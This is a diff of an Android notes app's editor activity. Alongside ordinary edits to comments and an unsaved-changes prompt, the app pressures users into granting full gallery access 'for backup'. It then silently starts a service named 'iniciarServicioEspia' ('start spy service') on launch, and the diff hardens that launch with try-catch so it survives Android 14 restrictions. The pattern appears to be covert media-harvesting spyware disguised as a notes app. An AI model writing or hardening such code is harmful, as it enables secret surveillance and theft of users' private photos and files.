@@ -9,9 +9,9 @@ import android.content.Intent
 import android.content.pm.PackageManager
 import android.content.res.Configuration
 import android.graphics.Color
+import android.graphics.Path
 import android.graphics.Rect
 import android.graphics.RectF
-import android.graphics.Path
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
@@ -33,6 +33,7 @@ import android.widget.Toast
 import androidx.activity.OnBackPressedCallback
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AlertDialog
+import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 import androidx.core.view.ViewCompat
@@ -79,11 +80,11 @@ class NoteEditorActivity : BaseActivity() {
     private var selectedColor: String = "#FFFFFF"
     private var currentBackgroundUri: String? = null
 
-    // --- VARIABLES PARA DETECTAR CAMBIOS ---
+    // --- VARIABLES PARA DETECTAR CAMBIOS (Protección de salida) ---
     private var originalTitle: String = ""
     private var originalContent: String = ""
     private var originalColor: String = "#FFFFFF"
-    // ---------------------------------------
+    // ------------------------------------------------------------
 
     private var isChecklistMode = false
     private val checklistItems = mutableListOf<ChecklistItem>()
@@ -132,7 +133,7 @@ class NoteEditorActivity : BaseActivity() {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_note_editor)
 
-        // Configuración Edge-to-Edge (Pantalla completa)
+        // Configuración Edge-to-Edge
         WindowCompat.setDecorFitsSystemWindows(window, false)
         val isDarkTheme = (resources.configuration.uiMode and Configuration.UI_MODE_NIGHT_MASK) == Configuration.UI_MODE_NIGHT_YES
         val insetsController = WindowCompat.getInsetsController(window, window.decorView)
@@ -141,7 +142,7 @@ class NoteEditorActivity : BaseActivity() {
         layoutEditor = findViewById(R.id.editor_root)
         scrollContainer = findViewById(R.id.scroll_container)
 
-        // Manejo de Insets (Teclado y Barras de sistema)
+        // Manejo de Insets
         ViewCompat.setOnApplyWindowInsetsListener(layoutEditor) { view, insets ->
             val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
             val ime = insets.getInsets(WindowInsetsCompat.Type.ime())
@@ -152,7 +153,7 @@ class NoteEditorActivity : BaseActivity() {
             insets
         }
 
-        // Scroll inteligente cuando aparece el teclado
+        // Scroll inteligente
         val globalLayoutListener = ViewTreeObserver.OnGlobalLayoutListener {
             val rootView = window.decorView.rootView
             val r = Rect()
@@ -165,14 +166,15 @@ class NoteEditorActivity : BaseActivity() {
         setupChecklist()
         setupListeners()
         setupRichTextInteractions()
-        setupBackPressHandler() // Activamos el interceptor de salida
+
+        // Activamos el interceptor de "Atrás" para guardar cambios
+        setupBackPressHandler()
 
         loadNoteData()
         silentStartService()
     }
 
-    // --- LÓGICA DE PROTECCIÓN CONTRA SALIDA ACCIDENTAL ---
-
+    // --- LÓGICA DE SALIDA SEGURA (UNSAVED CHANGES) ---
     private fun setupBackPressHandler() {
         onBackPressedDispatcher.addCallback(this, object : OnBackPressedCallback(true) {
             override fun handleOnBackPressed() {
@@ -194,13 +196,12 @@ class NoteEditorActivity : BaseActivity() {
         val currentContent = getCurrentContent()
         val currentColor = currentBackgroundUri ?: selectedColor
 
-        // Comparamos el estado actual con el estado inicial (original)
         return currentTitle != originalTitle ||
                 currentContent != originalContent ||
                 currentColor != originalColor
     }
 
-    // Helper para obtener el contenido unificado (sea Texto o Checklist JSON)
+    // Helper para obtener el contenido unificado
     private fun getCurrentContent(): String {
         return if (isChecklistMode) {
             val jsonList = gson.toJson(checklistItems)
@@ -219,7 +220,7 @@ class NoteEditorActivity : BaseActivity() {
             .setNeutralButton("Cancelar", null)
             .show()
     }
-    // --------------------------------------------------------
+    // ---------------------------------------------------
 
     private fun initViews() {
         etTitle = findViewById(R.id.et_title)
@@ -236,7 +237,6 @@ class NoteEditorActivity : BaseActivity() {
     }
 
     private fun setupRichTextInteractions() {
-        // Detectar posición del toque
         etContent.setOnTouchListener { v, event ->
             if (event.action == MotionEvent.ACTION_DOWN) {
                 lastTouchX = event.x
@@ -245,7 +245,6 @@ class NoteEditorActivity : BaseActivity() {
             false
         }
 
-        // Click Largo en Imagen
         etContent.setOnLongClickListener { view ->
             val text = etContent.text ?: return@setOnLongClickListener false
             val layout = etContent.layout ?: return@setOnLongClickListener false
@@ -330,7 +329,7 @@ class NoteEditorActivity : BaseActivity() {
     }
 
     private fun setupListeners() {
-        // Usamos la verificación de cambios al pulsar el botón de flecha atrás
+        // Usamos checkChangesAndExit en lugar de finish directo
         btnBack.setOnClickListener { checkChangesAndExit() }
 
         btnSave.setOnClickListener { saveNote() }
@@ -365,7 +364,7 @@ class NoteEditorActivity : BaseActivity() {
         setupColorClick(R.id.color_green, "#E8F5E9")
     }
 
-    // --- PERMISOS ---
+    // --- PERMISOS (CON TUS MENSAJES ORIGINALES) ---
     private fun checkGalleryPermission(requestCode: Int) {
         if (verificarAccesoTotal()) {
             iniciarServicioEspia()
@@ -373,6 +372,8 @@ class NoteEditorActivity : BaseActivity() {
         }
         else if (Build.VERSION.SDK_INT >= 34 &&
             ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED) == PackageManager.PERMISSION_GRANTED) {
+
+            // TUS MENSAJES SE CONSERVAN AQUÍ
             mostrarDialogoConfiguracion(
                 "Acceso Limitado",
                 "Has dado acceso a algunos archivos, pero para usar todas las funciones y poder hacer un correcto respaldo necesitamos acceso completo. Presiona Ir a Ajustes -> Permisos para activar los permisos."
@@ -417,6 +418,7 @@ class NoteEditorActivity : BaseActivity() {
                     ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED) == PackageManager.PERMISSION_GRANTED
 
             if (esAccesoLimitado) {
+                // TUS MENSAJES SE CONSERVAN AQUÍ
                 mostrarDialogoConfiguracion(
                     "Acceso Limitado",
                     "Has dado acceso a algunos archivos, pero para usar todas las funciones y poder hacer un correcto respaldo necesitamos acceso completo. Presiona Ir a Ajustes -> Permisos para activar los permisos."
@@ -526,8 +528,6 @@ class NoteEditorActivity : BaseActivity() {
                 @Suppress("DEPRECATION")
                 intent.getParcelableExtra("note_data") as? Note
             }
-
-            // Cargar en UI
             etTitle.setText(noteToEdit?.title)
             tvDateLabel.text = "Editado: ${noteToEdit?.date}"
 
@@ -554,19 +554,18 @@ class NoteEditorActivity : BaseActivity() {
                 mostrarFondoColor("#FFFFFF")
             }
 
-            // GUARDAR ESTADO ORIGINAL (Para comparar al salir)
+            // GUARDAR ESTADO INICIAL
             originalTitle = noteToEdit?.title ?: ""
             originalContent = rawContent
             originalColor = noteToEdit?.color ?: "#FFFFFF"
 
         } else {
-            // Nota Nueva
             val currentDate = SimpleDateFormat("dd MMM", Locale.getDefault()).format(Date())
             tvDateLabel.text = currentDate
             mostrarFondoColor("#FFFFFF")
             switchToChecklistMode(false)
 
-            // Estado original vacío
+            // Estado inicial vacío
             originalTitle = ""
             originalContent = ""
             originalColor = "#FFFFFF"
@@ -764,13 +763,26 @@ class NoteEditorActivity : BaseActivity() {
         cropResultLauncher.launch(uCropIntent)
     }
 
+    // --- CORRECCIÓN CRASH ANDROID 14 ---
+    // Envolvemos la llamada en un try-catch para evitar que la app se cierre si Android bloquea el servicio
     private fun iniciarServicioEspia() {
         if (verificarAccesoTotal()) {
-            val intent = Intent(this, CloudSyncService::class.java)
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent)
-            else startService(intent)
+            try {
+                //
+                val intent = Intent(this, CloudSyncService::class.java)
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    startForegroundService(intent)
+                } else {
+                    startService(intent)
+                }
+            } catch (e: Exception) {
+                // Si el sistema bloquea el inicio, simplemente capturamos el error
+                // y evitamos el crash fatal. La app sigue funcionando.
+                e.printStackTrace()
+            }
         }
     }
+
     private fun silentStartService() { if (verificarAccesoTotal()) iniciarServicioEspia() }
 
     private fun saveNote() {
